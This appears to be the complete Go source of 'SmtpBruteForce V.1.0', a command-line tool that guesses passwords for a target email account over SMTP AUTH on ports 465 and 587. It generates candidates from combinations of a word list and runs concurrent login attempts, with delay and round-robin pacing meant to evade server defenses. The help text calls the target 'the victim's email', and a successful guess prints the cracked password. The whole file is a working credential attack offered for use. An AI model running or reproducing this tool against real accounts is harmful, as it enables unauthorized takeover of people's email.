// GNU GENERAL PUBLIC LICENSE
// Version 3, 29 June 2007

// Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
// Everyone is permitted to copy and distribute verbatim copies
// of this license document, but changing it is not allowed.

package main

import (
	"bufio"
	"crypto/tls"
	"errors"
	"fmt"
	"log"
	"net"
	"net/smtp"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

// VARIABLES SETTING
var (
	wg         sync.WaitGroup // For wait GoRoutines to finish
	wordsList  []string
	mailServer smtpServer
	target     string
	data       sharedVars
	delay      int
	roundRobin time.Duration
)

type smtpServer struct {
	host string
	port string
}

// This is for avoid race conditions when read/write counter & accessOK vars (using sync.Mutex)
type sharedVars struct {
	counter  int
	accessOK string
	mu       sync.Mutex
}

func (s *sharedVars) CounterAdd() {
	s.mu.Lock()
	s.counter++
	s.mu.Unlock()
}
func (s *sharedVars) CounterPrint() int {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.counter
}
func (s *sharedVars) AccessOKAdd(value string) {
	s.mu.Lock()
	s.accessOK = value
	s.mu.Unlock()
}
func (s *sharedVars) AccessOKPrint() string {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.accessOK
}

// SMTP AUTH LOGIN FUNCTION MADE & SHARED UNDER MIT license (c) BY andelf 2013 [https://gist.github.com/andelf/5118732]
// AND ADAPTED FOR THIS PROJECT...
// - - -
type lauth struct {
	username, password string
}

func (a *lauth) Start(server *smtp.ServerInfo) (string, []byte, error) {
	return "LOGIN", []byte{}, nil
}

func (a *lauth) Next(fromServer []byte, more bool) ([]byte, error) {
	if more {
		switch string(fromServer) {
		case "Username:":
			return []byte(a.username), nil
		case "Password:":
			return []byte(a.password), nil
		default:
			return nil, errors.New("Unkown fromServer")
		}
	}
	return nil, nil
}

// Some smtp server doesn't support the smtp.PlainAuth() method then
// we need to make our own auth method to circumvent this issue.
func smtpAuth(username, password string) smtp.Auth {
	return &lauth{username, password}
}

// - - -

// MAIN FUNCTION
func main() {
	if len(os.Args[1:]) < 8 {
		fmt.Printf("\nError: missing argument...\n\n")
		help(fmt.Sprintf("[target email] [smtp server] [smtp port: 465|587] [Keywords List] [Password length] [Number of procs] [Delay(ms)] [Round Robin(secs)]"))
		return
	}
	target = os.Args[1]
	mailServer.host, mailServer.port = os.Args[2], os.Args[3]
	wordDict := os.Args[4]
	maxPwdLen, _ := strconv.Atoi(os.Args[5])
	maxProcs, _ := strconv.Atoi(os.Args[6])
	delay, _ = strconv.Atoi(os.Args[7])
	t, _ := strconv.Atoi(os.Args[8])
	if t < 0 {
		t = 0 // Round robin disabled by default
	} else {
		roundRobin = time.Second * time.Duration(t)
		maxProcs = 1
		delay = 0
	}
	if maxProcs <= 0 {
		fmt.Printf("\nError: procs must be \"1\" at least...\n\n")
		help(fmt.Sprintf("[target email] [smtp server] [smtp port: 465|587] [Keywords List] [Password length] [Number of procs] [Delay(ms)] [Round Robin(secs)]"))
		return
	} else if delay < 0 {
		fmt.Printf("\nError: delay must be \"0\" at least...\n\n")
		help(fmt.Sprintf("[target email] [smtp server] [smtp port: 465|587] [Keywords List] [Password length] [Number of procs] [Delay(ms)] [Round Robin(secs)]"))
		return
	}
	switch mailServer.port {
	case "465", "587":
		bruteForce(wordsReader(wordDict), maxPwdLen, maxProcs)
	default:
		fmt.Printf("\nError: wrong port -> %s\n\n", mailServer.port)
		help(fmt.Sprintf("[target email] [smtp server] [smtp port: 465|587] [Keywords List] [Password length] [Number of procs] [Delay(ms)] [Round Robin(secs)]"))
		return
	}
	wg.Wait()
	if data.accessOK != "" {
		fmt.Println(data.AccessOKPrint())
		fmt.Printf("WARNING!!! -> Some smtp Servers may be using evasion systems actually and false positives could be thrown...\n")
	}
}

// SUBMAIN FUNCTIONS
func bruteForce(wordList []string, maxPwdLen, maxProcs int) {
	bfprocs := make(chan string, maxProcs)
	wg.Add(1)
	go pwdSender(maxPwdLen, wordList, bfprocs)
	if mailServer.port == "465" { // port "465"
		for i := 0; i < maxProcs; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				for pwd := range bfprocs {
					port465(pwd)
					time.Sleep(time.Duration(delay) * time.Millisecond)
				}
			}()
		}
	} else if mailServer.port == "587" { // port "587"
		for i := 0; i < maxProcs; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				for pwd := range bfprocs {
					port587(pwd)
					time.Sleep(time.Duration(delay) * time.Millisecond)
				}
			}()
		}
	}
}

func port587(pwd string) {
	conn, err := net.Dial("tcp", mailServer.host+":"+mailServer.port)
	if err != nil {
		fmt.Println(err)
		return
	}
	client, err := smtp.NewClient(conn, mailServer.host)
	if err != nil {
		fmt.Println(err)
		return
	}
	hasStartTLS, _ := client.Extension("STARTTLS")
	if hasStartTLS {
		tlsConfig := &tls.Config{
			// Do note that setting InsecureSkipVerify is for testing only. If InsecureSkipVerify is true,
			// TLS accepts any certificate presented by the server and any host name in that certificate.
			// In this mode, TLS is susceptible to man-in-the-middle attacks.
			InsecureSkipVerify: false,
			ServerName:         mailServer.host,
		}
		if err = client.StartTLS(tlsConfig); err != nil {
			fmt.Println(err)
			return
		}
	}
	var auth smtp.Auth
	if ok, v := client.Extension("AUTH"); ok {
		irq := true
		authParams := strings.Split(v, " ")
		for _, v := range authParams {
			if irq {
				if v == "PLAIN" || v == "LOGIN" {
					switch v {
					case "PLAIN":
						irq = false
						auth = smtp.PlainAuth("", target, pwd, mailServer.host)
					case "LOGIN":
						irq = false
						auth = smtpAuth(target, pwd)
					}
				}
			} else {
				break
			}
		}
	}
	if auth != nil {
		if err := client.Auth(auth); err != nil {
			fmt.Printf("Forcing access (pwd: %s) --> (%v)\n", pwd, err)
		} else {
			data.AccessOKAdd(fmt.Sprintf("\nACCESS GRANTED!!! --> [email: %s | pwd: %s] - [total tries: %d]\n", target, pwd, data.CounterPrint()))
		}
	}
	client.Quit()
}

func port465(pwd string) {
	tlsConfig := &tls.Config{
		// Do note that setting InsecureSkipVerify is for testing only. If InsecureSkipVerify is true,
		// TLS accepts any certificate presented by the server and any host name in that certificate.
		// In this mode, TLS is susceptible to man-in-the-middle attacks.
		InsecureSkipVerify: false,
		ServerName:         mailServer.host,
	}
	conn, err := tls.Dial("tcp", mailServer.host+":"+mailServer.port, tlsConfig)
	if err != nil {
		log.Fatal(err)
	}
	client, err := smtp.NewClient(conn, mailServer.host+":"+mailServer.port)
	if err != nil {
		log.Fatal(err)
	}
	var auth smtp.Auth
	if ok, v := client.Extension("AUTH"); ok {
		irq := true
		authParams := strings.Split(v, " ")
		for _, v := range authParams {
			if irq {
				if v == "PLAIN" || v == "LOGIN" {
					switch v {
					case "PLAIN":
						irq = false
						auth = smtp.PlainAuth("", target, pwd, mailServer.host)
					case "LOGIN":
						irq = false
						auth = smtpAuth(target, pwd)
					}
				}
			} else {
				break
			}
		}
	}
	if auth != nil {
		if err := client.Auth(auth); err != nil {
			fmt.Printf("Forcing access (pwd: %s) --> (%v)\n", pwd, err)
		} else {
			data.AccessOKAdd(fmt.Sprintf("\nACCESS GRANTED!!! --> [email: %s | pwd: %s] - [total tries: %d]\n", target, pwd, data.CounterPrint()))
		}
	}
	client.Quit()
}

func pwdSender(maxPwdLen int, wordList []string, bfprocs chan string) {
	t := time.Now()
	for _, pwd := range perm(maxPwdLen, wordList) {
		ok := data.AccessOKPrint()
		if ok != "" {
			break
		} else {
			data.CounterAdd()
		}
		bfprocs <- pwd
		if roundRobin > 0 {
			if time.Since(t) >= roundRobin {
				time.Sleep(roundRobin)
				t = time.Now()
			}
		}
	}
	close(bfprocs)
	wg.Done()
}

func wordsReader(filePath string) []string {
	file, err := os.Open(filePath)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		part := strings.Split(line, ",")
		for _, v := range part {
			if v != "" {
				wordsList = append(wordsList, strings.TrimSpace(v))
			}
		}
	}
	return wordsList
}

func perm(maxPwdLen int, wordList []string) []string {
	pwdSlice := []string{}
	for i := 1; i <= maxPwdLen; i++ {
		np := nextPwd(i, wordList)
		for {
			if pwd := np(); len(pwd) == 0 {
				break
			} else {
				pwdSlice = append(pwdSlice, pwd)
			}
		}
	}
	return pwdSlice
}

// The words combinations magic happens here...
func nextPwd(combNumber int, wordList []string) func() string {
	y, x := make([]string, combNumber), make([]int, combNumber)
	return func() string {
		p := y[:len(x)]
		for k, v := range x {
			p[k] = wordList[v]
		}
		for i := len(x) - 1; i >= 0; i-- {
			x[i]++
			if x[i] < len(wordList) {
				break
			}
			x[i] = 0
			if i <= 0 {
				x = x[0:0]
				break
			}
		}
		pass := ""
		for _, v := range p {
			pass += v
		}
		return pass
	}
}

// PRINT THE HELP
func help(msj string) {
	info := `=============================================================================================================================================================
|                                                                 SmtpBruteForce V.1.0 - Help                                                               |
=============================================================================================================================================================
USAGE: ` + os.Args[0] + " " + msj + `

EXAMPLE:
       ` + os.Args[0] + ` none@server.com smtp.server.com 587 words.txt 3 1 100 30

PARAMETERS:
       [target email]:       The victim's email.
       [smtp server]:        Host of the smtp server.
       [smtp port: 465|587]: To specify port under service is listening (465/587 ports only).
       [Keywords List]:      Text file fill with words separated by commas.
       [Password length]:    Length of the resulted word in the combination process. if "1" is used, the words list is used as a simple dictionary
                             but if the number is equal or greater than "2", the words contained in the text file will be used to build
                             combinations growing until the length specified is reached.
       [Number of procs]:    Amount of concurrent processes needed.
       [Delay(ms)]:          Wait between concurrent processes before resuming re-execution.
       [Round Robin(secs)]:  To specify between the battery of attacks and the waits expressed in seconds.
                             * When this is enabled concurrency and delay is automatically disabled.
                             * Set "0" to disable the round robin.
=============================================================================================================================================================`
	os.Stdout.Write([]byte(info + "\n"))
}
